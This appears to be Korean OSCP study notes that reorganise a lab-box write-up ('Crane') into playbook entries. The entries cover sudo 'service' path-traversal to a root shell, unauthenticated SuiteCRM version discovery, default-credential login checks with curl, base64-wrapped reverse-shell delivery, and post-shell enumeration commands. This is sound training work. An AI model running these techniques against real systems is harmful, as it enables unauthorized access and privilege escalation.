> 방어 쪽에서 흔한 착각도 같이 적어둔다. "직렬화 문자열을 인코딩했으니 안전하다"는 base64가 보호가 아니라는 점에서 틀렸고, "우리 코드에는 위험한 클래스가 없다"는 가젯이 `vendor/` 안에서 나온다는 점에서 틀렸다. "클래스명을 화이트리스트로 검사한다"도 `allowed_classes`를 지정하지 않은 `unserialize()`가 파싱 시점에 이미 객체를 만들기 때문에 늦다. 확실한 방어는 사용자 데이터를 역직렬화하지 않는 것 하나뿐이고, 8장 첫 줄이 그래서 그렇게 쓰여 있다.

---

## 제안 11 — 신규 `B-3-?` : sudo `service` — 인자가 경로에 이어붙는 프로그램은 전부 탈출구

**② 신규** (B-3 리눅스 권한상승 절). ⚠️ `service` GTFOBins 카드가 현재 `_PLAYBOOK` 에 **없다**. `B-38. sudo -l 규칙 끝의 * 읽는 법 — 그리고 tar 체크포인트` 와 상호 참조를 걸 것.

**③ 넣을 본문**

````markdown
**`sudo -l` 에 `(ALL) NOPASSWD: /usr/sbin/service` 가 보이면 그 자리에서 끝.**

`/usr/sbin/service` 는 컴파일된 바이너리가 아니라 셸 스크립트임(데비안/Kali `init-system-helpers` 패키지). Kali 원문:

```sh
SERVICEDIR="/etc/init.d"

run_via_sysvinit() {
   # Otherwise, use the traditional sysvinit
   if [ -x "${SERVICEDIR}/${SERVICE}" ]; then
      exec env -i LANG="$LANG" … PATH="$PATH" TERM="$TERM" "$SERVICEDIR/$SERVICE" ${ACTION} ${OPTIONS}
   else
      echo "${SERVICE}: unrecognized service" >&2
      exit 1
   fi
}
```

| 조각 | 의미 |
|---|---|
| `"$SERVICEDIR/$SERVICE"` | **인용은 돼 있음.** 공백·세미콜론으로 명령을 주입하는 건 안 됨. 뚫리는 것은 **경로 구분자 `/` 를 안 거른다는 점 하나** |
| `if [ -x … ]` 가드 | 실행 비트가 있는 파일만 통과. 통과 못 하면 `unrecognized service` — 이 메시지가 보이면 경로가 틀렸거나 대상이 실행 불가라는 뜻 |
| `exec env -i …` | 환경변수를 로케일·`PATH`·`TERM` 만 남기고 통째로 비움 |

⚠️ **`env -i` 는 `sudo` 의 `env_reset` 보다 한 겹 더 강하다.** `sudo -l` 에 `env_reset` 이 안 보이더라도 `service` 를 경유하면 `LD_PRELOAD`·`LD_LIBRARY_PATH`·`IFS`·`BASH_ENV` 계열은 **두 겹으로 막혀** 여전히 안 통함. 남는 공격면이 「인자가 경로에 이어붙는다」 하나뿐이고 그것이 GTFOBins 에 오른 이유임.

| 입력 | 이어붙인 결과 | 실행되는 것 |
|---|---|---|
| `apache2` | `/etc/init.d/apache2` | 정상 동작 |
| `../../bin/bash` | `/etc/init.d/../../bin/bash` | **`/bin/bash`** |
| `../../../../../bin/bash` | `/etc/init.d/../../../../../bin/bash` | **`/bin/bash`**(동일) |

```bash
sudo /usr/sbin/service ../../../../../bin/bash
```

`..` 를 넉넉히 넣어도 되는 이유는 커널 경로 해석에서 `/..` 가 `/` 이기 때문임. 루트보다 위는 없으므로 초과분이 조용히 흡수됨 — **정확한 깊이를 셀 필요가 없음.** 디렉터리 트래버설(`../../../etc/passwd`)에서도 똑같이 쓰는 성질.

**`sudo -l` 출력 읽는 법:**

| 줄 | 의미 |
|---|---|
| `(ALL) NOPASSWD: <프로그램>` | 모든 사용자로(root 포함) 비밀번호 없이 실행 가능 |
| `env_reset` | 환경변수 초기화 → `LD_PRELOAD`·`LD_LIBRARY_PATH` 봉쇄 |
| `secure_path=...` | `PATH` 고정 → PATH 하이재킹 봉쇄 |
| 인자 제한이 없음 | **인자를 자유롭게 줄 수 있다는 것이 취약점의 전부** |

`env_reset` 과 `secure_path` 가 보이면 환경변수 계열은 죽었다고 판단하고 **곧바로 GTFOBins 로 갈 것.**

**일반화 — `sudo -l` 에 걸린 프로그램이 아래 넷 중 하나라도 하면 거의 예외 없이 권한상승이 된다:**
① 인자를 경로에 이어붙임 ② 셸을 띄움 ③ 파일을 읽고 씀 ④ 외부 명령을 부름.

반사적으로 확인할 것 — `service` · `tar`(`--checkpoint-action=exec`) · `zip`(`-T -TT`) · `awk` · `find`(`-exec`) · `vim`/`less`/`man`(`!sh`) · `git`(`-p` 페이저) · `env` · `nmap`(구버전 `--interactive`) · `docker` · `systemctl`.
GTFOBins(<https://gtfobins.github.io>)에서 프로그램명을 검색하는 데 10초면 됨. **`sudo -l` 결과가 나오는 즉시 그렇게 할 것.**

**출처** — [[Crane]] (`www-data` → root). 같은 골격 — [[Cockpit]](`tar … *` 와일드카드).
````

**④ 지우기 전 원문** (원본 4-1 표 + 4-2 전량)

> 이 출력에서 네 줄을 읽는다.
>
> | 줄 | 의미 |
> |---|---|
> | `(ALL) NOPASSWD: /usr/sbin/service` | 모든 사용자로(=root 포함) 비밀번호 없이 `service`를 실행할 수 있다. `www-data`의 비밀번호를 모르는 상황이라 `NOPASSWD`가 아니었으면 여기서 끝이었다 |
> | `env_reset` | 환경변수가 초기화된다 → `LD_PRELOAD`·`LD_LIBRARY_PATH` 트릭은 봉쇄 |
> | `secure_path=...` | `PATH`가 고정된다 → PATH 하이재킹도 봉쇄 |
> | 인자 제한이 없다 | `/usr/sbin/service ""` 같은 인자 제약이 걸려 있지 않다. **인자를 자유롭게 줄 수 있다는 것이 이 취약점의 전부**다 |
>
> `env_reset`과 `secure_path`가 보이면 환경변수 계열은 죽었다고 판단하고 곧바로 GTFOBins로 간다.

(⚠️ 위 표는 **노트 `Privilege Escalation` 절에 그대로 남겼다.** 실측 출력의 해설이라 심사관 납득에 필요하다. 이관 대상은 아래 일반화 부분이다.)

> `env -i`는 4-1의 `env_reset`보다 한 겹 더 강하다. `sudo`의 `env_reset`이 환경을 정리하는 단계라면 `service`의 `env -i`는 그 뒤에 한 번 더 비운다. `LD_PRELOAD`·`LD_LIBRARY_PATH`·`IFS`·`BASH_ENV` 계열은 두 겹으로 막혀 있어서, `sudo -l`에 `env_reset`이 안 보이더라도 `service`를 경유하면 여전히 안 통한다. 남는 공격면이 "인자가 경로에 이어붙는다" 하나뿐이고 그것이 GTFOBins에 오른 이유다.

> `..`를 넉넉히 넣어도 되는 이유는 커널의 경로 해석에서 `/..`가 `/`이기 때문이다. 루트보다 위는 없으므로 초과분이 조용히 흡수된다. **정확한 깊이를 셀 필요가 없다** — 디렉터리 트래버설(`../../../etc/passwd`)에서도 똑같이 쓰는 성질이다.
>
> 일반화하면, `sudo -l`에 걸린 프로그램이 인자를 경로에 이어붙이거나 셸을 띄우거나 파일을 읽고 쓰거나 외부 명령을 부르면 거의 예외 없이 권한상승이 된다.
> 반사적으로 확인할 것: `service`·`tar`(`--checkpoint-action=exec`)·`zip`(`-T -TT`)·`awk`·`find`(`-exec`)·`vim`/`less`/`man`(`!sh`)·`git`(`-p` 페이저)·`env`·`nmap`(구버전 `--interactive`)·`docker`·`systemctl`.
> GTFOBins(https://gtfobins.github.io)에서 프로그램명을 검색하는 데 10초면 된다. `sudo -l` 결과가 나오는 즉시 그렇게 한다.

---

## 제안 12 — `B-1-29. 제품별 비인증 버전 엔드포인트 — 열거 시간을 5분에서 30초로`

**② 병합** — SuiteCRM 행 + **파라미터 필수성 반증**(소스 근거 있음)

**③ 넣을 본문**

````markdown
**SuiteCRM / SugarCRM** — `service/v4_1/rest.php` 의 `get_server_info` 가 **인증 없이** 버전을 뱉음.

```bash
curl -s "http://<타겟>/service/v4_1/rest.php?method=get_server_info&input_type=JSON&response_type=JSON&rest_data=%7B%7D"
```
```text
{"flavor":"CE","version":"6.5.25","suitecrm_version":"7.12.3","gmt_time":"2026-08-19 07:53:08"}
```

⚠️ **`version` 이 아니라 `suitecrm_version` 을 볼 것.** `version: 6.5.25` 는 SuiteCRM 이 포크한 SugarCRM CE 의 **기반 버전**이지 제품 버전이 아님. CVE 매칭은 `suitecrm_version` 쪽으로 함.

`rest_data=%7B%7D` 는 `{}`(빈 JSON 객체)의 URL 인코딩.

**「파라미터 4개가 다 있어야 응답한다」는 흔한 오해다 — 소스가 반증한다.** v7.12.3 태그의 `service/core/REST/SugarRestJSON.php`:

```php
$json_data = !empty($_REQUEST['rest_data'])? $GLOBALS['RAW_REQUEST']['rest_data']: '';
```

`rest_data` 가 없으면 fault 없이 **빈 문자열로 조용히 폴백**함. `input_type`/`response_type` 도 서비스 생성자에 기본값이 있음. **fault 를 내는 것은 `method` 하나뿐**으로 `if(empty($_REQUEST['method']) || !method_exists(...))` 분기에서만 에러가 남.

**일반화** — 파라미터가 안 먹을 때 「필수 파라미터가 빠졌나」부터 의심할 이유가 없음. 어느 파라미터가 진짜 필수인지는 **엔트리포인트 소스 한 파일이면 확정됨.** 제품이 GitHub 에 있으면 **해당 태그**를 볼 것 — main 브랜치는 이미 달라져 있음.

**출처** — [[Crane]].
````

**④ 지우기 전 원문** (원본 1장 「서비스 식별 — 버전 확정」)

> `get_server_info`가 비인증이라는 것이 SuiteCRM 열거의 출발점이다. 버전 특정이 곧 CVE 특정이므로 이 제품을 만나면 이걸 먼저 친다.
>
> 버전 판정은 독립 근거 두 개로 했다 — REST `get_server_info`의 `suitecrm_version: 7.12.3`, 그리고 `/README.md` 선두 헤딩의 `# SuiteCRM 7.12.3`.
> 같은 응답에 있는 **`version: 6.5.25`에 낚이면 안 된다.** 이건 SuiteCRM이 포크한 SugarCRM CE의 기반 버전이지 제품 버전이 아니다. CVE 매칭은 `suitecrm_version` 쪽으로 한다.
> 같은 패턴: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]]
>
> `rest_data=%7B%7D`는 `{}`(빈 JSON 객체)의 URL 인코딩이다.
>
> 파라미터 4개를 다 붙이는 건 습관이지 필수 조건이 아니다. "`method`·`input_type`·`response_type`·`rest_data` 가 모두 있어야 응답한다"는 흔한 오해인데, v7.12.3 태그의 `service/core/REST/SugarRestJSON.php`를 열면 틀렸다는 게 바로 보인다.
>
> ```php
> $json_data = !empty($_REQUEST['rest_data'])? $GLOBALS['RAW_REQUEST']['rest_data']: '';
> ```
>
> `rest_data`가 없으면 fault 없이 빈 문자열로 폴백한다. `input_type`/`response_type`도 서비스 생성자에 기본값이 있다. **fault를 내는 것은 `method` 하나뿐**으로, `if(empty($_REQUEST['method']) || !method_exists(...))` 분기에서만 에러가 난다.
>
> 그러니 파라미터가 안 먹을 때 "필수 파라미터가 빠졌나"부터 의심할 이유가 없다. 어느 파라미터가 진짜 필수인지는 엔트리포인트 소스 한 파일이면 확정된다. 제품이 GitHub에 있으면 **해당 태그**를 봐야 한다 — main 브랜치는 이미 달라져 있다.

(⚠️ 「독립 근거 2개」·`version` vs `suitecrm_version` 구분·`rest_data` 인코딩 설명은 **노트에도 남겼다.** 이관 대상은 소스 반증과 일반화다.)
> (v7.12.3 태그의 `README.md`는 1~3행이 `suitecrm.com` 로고 링크이고 버전 헤딩은 그 아래에 온다. "1행"이라고 외우지 말고 `head -10`으로 본다.)

---

## 제안 13 — `B-1-37. 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표`

**② 병합** — SuiteCRM 행 + curl 판정법

**③ 넣을 본문**

````markdown
**SuiteCRM / SugarCRM — `admin:admin`.** [[Crane]] 에서 성립. 로그인 폼에 `csrf_token` 이 없어 curl 한 방으로 검증됨.

```bash
curl -sS -i -X POST 'http://<타겟>/index.php' \
    -d 'module=Users&action=Authenticate&user_name=admin&username_password=admin&Login=Log+In'
```

`302` + `Location: index.php?module=Home&action=index` = 성공. 실패 시에는 `Location: index.php?module=Users&action=Login&loginErrorMessage=...` 로 되돌림.

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-i` | 응답 헤더 출력 | 성공/실패가 `Location:` 헤더로 갈려 **판정 자체가 불가능** |
| `-sS` | 진행률만 끄고 에러는 표시 | `-s` 만 쓰면 연결 실패도 조용히 지나감 |
| `-L` 미사용 | 리다이렉트를 따라가지 않음 | 붙이면 302 를 따라가 최종 200 만 보임 — **판정 신호 소멸** |

**로그인 판정은 상태코드와 `Location` 헤더로 한다.** 200 본문 길이 비교보다 확실함(A-12 와 같은 선 — 200 이 성공이 아니고 302 가 실패가 아님. **어디로 보내는지**를 볼 것).

⚠️ **post-auth CVE 를 만나면 CVE 보다 기본 자격증명이 먼저다.** [[Crane]] 의 실제 정답 순서도 ① 기본 자격증명 시도 → ② CVE 발사였음. 순서를 거꾸로 하면 「CVE 가 안 먹는다」고 오판함. `admin:admin`·`admin:password`·`admin:<제품명>`·`root:root` — **30초면 됨.**
````

**④ 지우기 전 원문** (원본 3-1 + 7장 2)

> CVE를 태우기 전에 로그인부터 확인한다. SuiteCRM 로그인 폼에는 `csrf_token`이 없어서 curl 한 방으로 검증된다.
> …
> 이 판정은 curl 플래그 세 개에 달려 있다.
> …
> 로그인 성공/실패 판정은 상태코드와 `Location` 헤더로 한다. 실패 시 SuiteCRM은 `Location: index.php?module=Users&action=Login&loginErrorMessage=...` 로 되돌린다. 200 본문 길이 비교보다 확실하다.

> 2. **기본 자격증명은 항상 먼저 시도한다.** `admin:admin` 한 번으로 인증 전제조건이 해결됐다. post-auth CVE는 자격증명이 선행 조건이므로 순서를 거꾸로 하면 "CVE가 안 먹는다"고 오판한다.

(⚠️ curl 플래그 표와 판정 서술은 **노트에도 남겼다** — 실측 명령의 해설이라 심사관 재현에 필요. 이관은 제품별 기본값 색인 목적의 중복 등재다.)

---

## 제안 14 — `B-81. 페이로드는 base64로 감싼다`

**② 병합** — `echo -n` / `base64 -w0` 함정

**③ 넣을 본문**

````markdown
**`-n` 과 `-w0` 을 빼면 조용히 깨진다.**

```bash
echo -n '<cmd>' | base64 -w0
```

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `echo -n` | 후행 개행 제거 | 개행이 base64 에 포함돼 디코드 결과 끝에 `\n` 이 붙음. 대개 무해하나 **명령을 셸 인자로 재조립할 때 문제가 됨** |
| `base64 -w0` | 줄바꿈 없이 한 줄로 | **기본값이 76자마다 줄바꿈.** 여러 줄이 된 base64 를 HTTP 파라미터에 넣으면 잘려나가 디코드 실패 |

전달 형태 — `echo <b64> | base64 -d | bash`. **마지막이 `sh` 가 아니라 `bash` 여야 함**(A-31: PHP `system()` 은 `/bin/sh -c` 를 쓰고 데비안 `sh` 는 dash 라 `/dev/tcp` 를 못 씀).

**출처** — [[Crane]] (역직렬화 → `system()` → 리버스셸).
````

**④ 지우기 전 원문** (원본 3-2 + 7장 8)

> **`-n`과 `-w0`을 빼면 조용히 깨진다.**
>
> | 플래그 | 역할 | 빼면 |
> |---|---|---|
> | `echo -n` | 후행 개행 제거 | 개행이 base64에 포함되어 디코드 결과 끝에 `\n`이 붙는다. 대개 무해하지만 명령을 셸 인자로 재조립할 때 문제가 된다 |
> | `base64 -w0` | 줄바꿈 없이 한 줄로 | **기본값이 76자마다 줄바꿈**이다. 여러 줄이 된 base64를 HTTP 파라미터에 넣으면 잘려나가 디코드가 실패한다 |

> 8. **base64 래핑은 인용 중첩의 표준 해법이다.** `echo -n '<cmd>' | base64 -w0` → `echo <b64> | base64 -d | bash`. `-n`과 `-w0`을 빼먹으면 조용히 실패한다. 같은 목적의 대안은 hex 리터럴([[Hawat]] · [[Squid]]).

> | 조각 | 역할 | 빼면 어떻게 되는가 |
> |---|---|---|
> | `echo <base64>` | 인코딩된 리버스셸을 stdout으로 | — |
> | `\| base64 -d` | 디코드해서 원래 bash 한 줄로 복원 | 인코딩 없이 원문을 그대로 넣으면 `>`·`&`가 셸/HTTP 파라미터 경계에서 깨진다 |
> | `\| bash` | 복원된 명령을 실행 | **`sh`로 넘기면 실패한다** — 아래 참조 |

(⚠️ `-n`/`-w0` 설명 자체는 **노트에도 남겼다** — 실측 명령의 해설이다.)

---

## 제안 15 — `A-14. 공개 PoC는 실행 전에 소스를 읽는다` + `E. OSCP 시험 규정`

**② 병합** (양쪽 절에 각각)

**③ 넣을 본문 — `A-14` 쪽**

```markdown
**판단할 것은 금지 여부가 아니라 「스크립트가 죽었을 때 이어갈 수 있느냐」다.** 공개 PoC 는 버전이 조금만 달라도, 폼 필드가 하나만 바뀌어도 **조용히 실패**함.

**소스를 열면 그것이 곧 수동 절차다.** [[Crane]] `exploit.py` 를 읽어 복원한 것:
- 실제로 보내는 필드 6개 — `module`·`action`·`name`·`status`·`schedule_type`·`email_recipients`
- 헤더 — `Referer: <host>` + `content-type: application/x-www-form-urlencoded`
- **`name`·`status`·`schedule_type`·`Referer` 를 빼면 레코드 생성이 실패함**

**클론본은 손대기 전에 `git log` 와 `git status --porcelain` 을 볼 것.** [[Crane]] 의 클론본은 `FIX: added auto trigger rev sh` 커밋이 들어간 판본이라 트리거까지 자동이었고, `git status` 가 비어 있어 무수정 실행이었음이 확정됨. **어떤 판본을 돌렸는지가 결과 해석을 바꿈.**

**로그 «순서»가 진단 도구다.** 스크립트가 어느 로그 줄에서 멈췄는지를 소스와 대조하면 어느 HTTP 요청이 반환되지 않았는지가 나옴(A-12).
```

**③ 넣을 본문 — `E. OSCP 시험 규정` 쪽**

```markdown
| 도구 | 판정 | 근거 |
|---|---|---|
| **특정 CVE 하나를 겨냥한 공개 PoC 스크립트**(GitHub·exploit-db) | **허용** | 금지 정의는 *"if a tool is capable of automatically discovering and exploiting vulnerabilities … resulting in automatic remote access … without effort or enumeration"* — 걸리는 지점은 **「스스로 발견(discovering)까지 한다」**임. 특정 CVE PoC 는 어느 CVE·어느 엔드포인트인지를 **내가 열거해서 정해준 뒤에야** 동작함. 애초에 OSCP 는 exploit-db·GitHub 익스플로잇 사용을 전제로 설계된 시험이고 `searchsploit` 이 기본 탑재된 이유가 그것임 |
| **phpggc** (PHP 가젯 체인 생성기) | **허용** | 익스플로잇이 아니라 **페이로드 생성기**. **타겟과 통신조차 하지 않음** — msfvenom 과 같은 범주 |
```

**④ 지우기 전 원문** (원본 2-1 말미 · 3-2 · 7장 5)

> phpggc는 익스플로잇이 아니라 페이로드 생성기다. 취약한 엔드포인트에 전달하는 일은 직접 해야 하니 msfvenom과 같은 범주이고, OSCP에서 쓸 수 있다. 시험 금지 정의는 *"automatically discovering and exploiting … without effort or enumeration"* 인데 phpggc는 타겟과 통신조차 하지 않는다.

> **공개 PoC 스크립트는 시험에서 허용된다.** OffSec의 금지 정의는 이렇다:
>
> > *"if a tool is capable of automatically discovering and exploiting vulnerabilities on a target machine resulting in automatic remote access … without effort or enumeration"* — 열거된 예: `db_autopwn` · `browser_autopwn` · SQLmap · SQLninja
>
> 걸리는 지점은 "스스로 발견(discovering)까지 한다"이다. 특정 CVE 한 건을 겨냥한 공개 PoC는 취약점을 발견하지 않는다 — 어느 CVE인지, 어느 엔드포인트인지를 내가 열거해서 정해준 뒤에야 동작한다. 애초에 OSCP는 exploit-db·GitHub 익스플로잇 사용을 전제로 설계된 시험이고, `searchsploit`이 기본 탑재된 이유가 그것이다.
>
> 그러니 판단할 것은 금지 여부가 아니라 **스크립트가 죽었을 때 이어갈 수 있느냐**다. 공개 PoC는 버전이 조금만 달라도, 폼 필드가 하나만 바뀌어도 조용히 실패한다.

> PoC를 쓰더라도 소스를 열어 어떤 HTTP 요청을 보내는지 읽어둔다. 그게 곧 수동 절차이고, 스크립트가 실패했을 때 디버깅할 수단이다.

> 5. **공개 PoC 스크립트(`exploit.py`)는 시험에서 허용된다.** OSCP 금지 정의는 *"automatically discovering and exploiting"* — 스스로 취약점을 찾는 도구(`db_autopwn`·`browser_autopwn`·SQLmap·SQLninja)를 겨냥한다. 특정 CVE 하나를 겨냥한 PoC는 네가 열거해서 정해준 뒤에야 동작하므로 해당되지 않는다. 애초에 exploit-db 사용을 전제로 만든 시험이다.
>    - 판단 기준은 "금지냐"가 아니라 "스크립트가 죽으면 이어갈 수 있느냐"다. 버전이 조금만 달라도 공개 PoC는 조용히 실패한다.
>    - PoC를 쓰더라도 반드시 소스를 열어 "어떤 HTTP 요청을 보내는가"를 읽어라. 그게 곧 수동 절차이고, 스크립트가 죽었을 때의 유일한 디버깅 수단이다.

---

## 제안 16 — `C-2. 셸 직후` · `C-3. 플래그·증거` · `C-1. 정찰 직후`

**② 병합** (이미 있으면 건너뛰고, 없는 항목만 append)

**③ 넣을 본문**

```markdown
`C-2` — 셸을 얻은 직후 고정 루틴 5개. ⚠️ **TTY 업그레이드를 «먼저» 하고 열거를 시작할 것**(A-38 · TTY 오판 항목).

```text
id                                        # 소속 그룹 (docker/lxd/disk/adm이면 즉시 승부)
sudo -l                                   # GTFOBins 대조
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null                   # capabilities
cat /etc/crontab; ls -la /etc/cron.*      # 크론
```

[[Crane]] 은 **두 번째 줄에서 끝났음.**

`C-3` — 시험에서는 플래그를 `whoami`/`hostname`/`ip a` 와 **한 화면에** 찍어야 인정됨. 노트에도 같은 습관을 남길 것.

```bash
whoami; hostname; ip a; cat /var/www/local.txt
whoami; hostname; ip a; cat /root/proof.txt
```

⚠️ **프롬프트는 증거가 아니다.** `hostname` 바이너리가 있고 프롬프트에 호스트명이 보여도 **명령 출력으로 남겨야 함.**

`C-1` — `nnmap` 별칭 플래그가 각각 왜 붙어 있는가.

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 1~65535 전수 | 기본 1000포트만 봄. **웹이 고번호에 숨은 박스는 통째로 놓침** |
| `-Pn` | 호스트 발견 생략 | ICMP 를 막는 랩 타겟이면 「host down」으로 스캔이 시작조차 안 됨 |
| `-sCV` | 기본 NSE + 버전 탐지 | `http-title`·`http-robots.txt` 가 안 나옴. [[Crane]] 은 `http-title: SuiteCRM` 한 줄이 시작점이었음 |
| `--min-rate 5000` | 초당 최소 패킷 | 없으면 `-p-` 가 수십 분 감 — 24시간 시험에서 감당 불가 |
| `-oN nmap.log` | 원문 저장 | 보고서 증빙과 재확인용. 스크롤백은 사라짐 |

⚠️ **NSE 없는 스캔과 있는 스캔이 «같은 포트에 다른 서비스»를 낼 수 있음.** [[Crane]] 은 `-sCV -A` 쪽이 `Apache httpd 2.4.38`, `-sS -sV` 쪽이 `tcpwrapped` 였음. `tcpwrapped` = 핸드셰이크는 성립했으나 버전 프로브 중 연결이 끊긴 것이지 「서비스 없음」이 아님. **NSE 가 붙은 쪽 판정을 따를 것.**
```

**④ 지우기 전 원문** (원본 1장 플래그 표 · 4-1 · 5장 말미)

> 플래그 조합은 `nnmap` 별칭 그대로다. 각각이 왜 붙어 있는지:
>
> | 플래그 | 역할 | 빼면 어떻게 되는가 |
> |---|---|---|
> | `-p-` | 1~65535 전수 | 기본 1000포트만 본다. **웹이 고번호에 숨은 박스는 통째로 놓친다** |
> | `-Pn` | 호스트 발견 생략 | ICMP를 막는 랩 타겟이면 "host down"으로 스캔이 시작조차 안 된다 |
> | `-sCV` | 기본 NSE + 버전 탐지 | `http-title`·`http-robots.txt`가 안 나온다. 이 박스는 `http-title: SuiteCRM` 한 줄이 시작점이었다 |
> | `--min-rate 5000` | 초당 최소 패킷 | 없으면 `-p-`가 수십 분 간다 — 24시간 시험에서 감당할 수 없는 시간이다 |
> | `-oN nmap.log` | 원문 저장 | 보고서 증빙과 재확인용. 스크롤백은 사라진다 |

> ### 4-1. 열거 — 셸 잡자마자 치는 5개
>
> 셸을 얻은 직후의 고정 루틴은 이렇다. 이 박스는 **두 번째 줄에서 끝났다**:
>
> ```text
> id                              # 소속 그룹 (docker/lxd/disk/adm이면 즉시 승부)
> sudo -l                         # ← 이 박스의 정답
> find / -perm -4000 -type f 2>/dev/null   # SUID
> getcap -r / 2>/dev/null         # capabilities
> cat /etc/crontab; ls -la /etc/cron.*     # 크론
> ```

> 시험에서는 플래그를 `whoami`/`hostname`/`ip a`와 한 화면에 찍어야 인정된다. 노트에도 같은 습관을 남긴다.
>
> ```bash
> whoami; hostname; ip a; cat /var/www/local.txt
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스는 `hostname` 바이너리가 있고 프롬프트에도 `crane`이 보이지만 **프롬프트는 증거가 아니다.** 명령 출력으로 남겨야 한다.

> > [!tip] 시험 반사 체크 — 이 박스로 답이 채워지는가
> > - [ ] **셸을 잡자마자 칠 명령 5개**: `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.*`
> > - [ ] **SuiteCRM/SugarCRM을 다시 만나면 가장 먼저**: `curl .../service/v4_1/rest.php?method=get_server_info...` → 버전 확정, 그리고 `admin:admin`
> > - [ ] **자동 도구 없이 같은 결과**: phpggc로 페이로드 생성 + curl로 `AOR_Scheduled_Reports` Save POST
> > - [ ] **이 단계에서 실패했다면 다음 후보**: SuiteCRM 다른 CVE(7.12.x 계열 SQLi/XSS) → `/ical_server.php`(WebDAV, 401) → SSH 자격증명 재사용
> > - [ ] **리버스셸이 안 붙으면**: `sh` vs `bash` → 아웃바운드 포트 → 인용 파손 → tun0 IP 오타

⚠️ `tcpwrapped` 대목은 **개작 중 새로 발견한 것**이다 — 원본 노트는 `nmap_full.txt` 를 아예 언급하지 않았다.

---

## 제안 17 — `D. 시간 배분 · 손절 기준`

**② 병합** — SuiteCRM/역직렬화 골격의 손절선 표

**③ 넣을 본문**

```markdown
**웹 제품 + post-auth CVE + `sudo -l` GTFOBins 골격의 손절선** ([[Crane]]).

| 단계 | 적정 시간 | 손절 신호 |
|---|---|---|
| nmap `-p-` | ~1분 | `--min-rate` 없이 10분을 넘기면 즉시 중단하고 다시 걸 것 |
| 버전 확정 | ~5분 | 비인증 엔드포인트·README·헤더·푸터 중 2개로 교차되면 끝 |
| `/install.log` 등 인스톨러 잔존물 조사 | **5분 상한** | 로그에 자격증명이 없고 잠금 플래그가 걸린 것을 확인하면 즉시 접을 것 |
| 디렉터리 브루트 결과 정독(1085행) | **하지 말 것** | **제품이 특정된 뒤에는 브루트포스 결과의 가치가 급락함** |
| CVE 검색 → PoC 확보 | ~10분 | `searchsploit` 이 비면 즉시 CVE 검색으로 전환 |
| 익스플로잇 발사 후 대기 | **30초** | 그 안에 **리스너**를 확인. 스크립트를 쳐다보며 기다리지 말 것 |
| `sudo -l` → GTFOBins | ~2분 | 항목이 있으면 끝. 없으면 SUID/cap/cron 으로 즉시 이동 |

[[Crane]] 의 이론상 최소 시간은 15분 안쪽. **시간이 새는 곳은 ① searchsploit 오독 ② 「행」 착시 둘뿐이고 둘 다 판단 착오이지 기술 부족이 아님.**
```

**④ 지우기 전 원문** (원본 6장 ⑩)

> ### ⑩ 시간 배분 — 어디서 손절했어야 하는가
>
> | 단계 | 적정 시간 | 손절 신호 |
> |---|---|---|
> | nmap `-p-` | ~1분 | `--min-rate` 없이 10분을 넘기면 즉시 중단하고 다시 건다 |
> | 버전 확정 | ~5분 | 비인증 엔드포인트·README·헤더·풋터 중 2개로 교차되면 끝 |
> | `/install.log` 등 인스톨러 잔존물 조사 | **5분 상한** | 로그에 자격증명이 없고 `installer_locked`가 걸린 것을 확인하면 즉시 접는다 |
> | feroxbuster 1085행 정독 | **하지 말 것** | 제품이 특정된 뒤에는 브루트포스 결과의 가치가 급락한다 |
> | CVE 검색 → PoC 확보 | ~10분 | searchsploit이 비면 즉시 CVE 검색으로 전환 |
> | 익스플로잇 발사 후 대기 | **30초** | 그 안에 리스너를 확인한다. 스크립트를 쳐다보며 기다리지 않는다 |
> | `sudo -l` → GTFOBins | ~2분 | 항목이 있으면 끝. 없으면 SUID/cap/cron으로 즉시 이동 |
>
> 이 박스의 이론상 최소 시간은 15분 안쪽이다. 시간이 새는 곳은 ①(searchsploit 오독)과 ②(행 착시) 둘뿐이고, 둘 다 판단 착오이지 기술 부족이 아니다.

---

## 제안 18 — 신규 `B-6-?` 또는 `B-2-?` : DB 자격증명을 얻어도 원격에서 못 쓸 수 있다

**② 신규** (자격증명 절 또는 네트워크 서비스 절. 반영자 판단)

**③ 넣을 본문**

```markdown
**증상** — `config.php`·`.env` 에서 DB 자격증명을 얻었는데 Kali 에서 `mysql -h <타겟>` 이 거부됨.

**예고편은 이미 nmap 에 있다** — `3306/tcp open mysql MySQL (unauthorized)`. 포트는 열렸는데 내 IP 가 `mysql.user` 의 어떤 `user@host` 행과도 매칭되지 않은 것.

**의심 순서:** ① 호스트 제한(`user@localhost`) ② `bind-address`

**우회:** SSH 포트포워딩(`ssh -L 3306:127.0.0.1:3306`) 또는 이미 잡은 셸/웹셸을 경유(B-71).

⚠️ **`config.php` 의 `db_host_name => 'localhost'` 는 「앱이 접속하는 주소」일 뿐 서버측 호스트 ACL 이 아니다.** 둘을 같은 것으로 읽으면 안 됨.

**이 값의 진짜 가치는 패스워드 재사용 쪽이다** — 얻은 비밀번호로 SSH·다른 서비스를 다시 시도할 것. ([[Crane]] 은 빈 문자열이라 무의미했음)

**출처** — [[Crane]] (MySQL `root` / 빈 패스워드. `SELECT user,host FROM mysql.user` 는 조회하지 않아 `root@localhost` 만 존재했는지는 `[가정]`).
```

**④ 지우기 전 원문** (원본 4-3 + 7장 13)

> **이 자격증명은 외부에서 못 쓴다.** nmap이 `3306/tcp MySQL (unauthorized)`를 낸 직접 원인은 내 접속 호스트가 `mysql.user`의 어떤 `user@host` 행과도 매칭되지 않았다는 것이다.
> `root@localhost`만 존재했을 가능성이 높지만 `[가정]` — `SELECT user,host FROM mysql.user`를 조회하지는 않았다. `config.php`의 `db_host_name => 'localhost'`는 앱이 접속하는 주소일 뿐 서버측 호스트 ACL이 아니다. 둘을 같은 것으로 읽으면 안 된다.
> (1장 nmap 해설표는 이 구분을 지켜 "내 IP가 `mysql.user` 호스트 목록에 없다"로 써놨다.)
> DB 자격증명을 얻었는데 원격 접속이 거부되면 ① 호스트 제한(`user@localhost`) ② bind-address 를 의심하고, SSH 포트포워딩(`ssh -L 3306:127.0.0.1:3306`)이나 이미 잡은 웹셸을 경유한다.
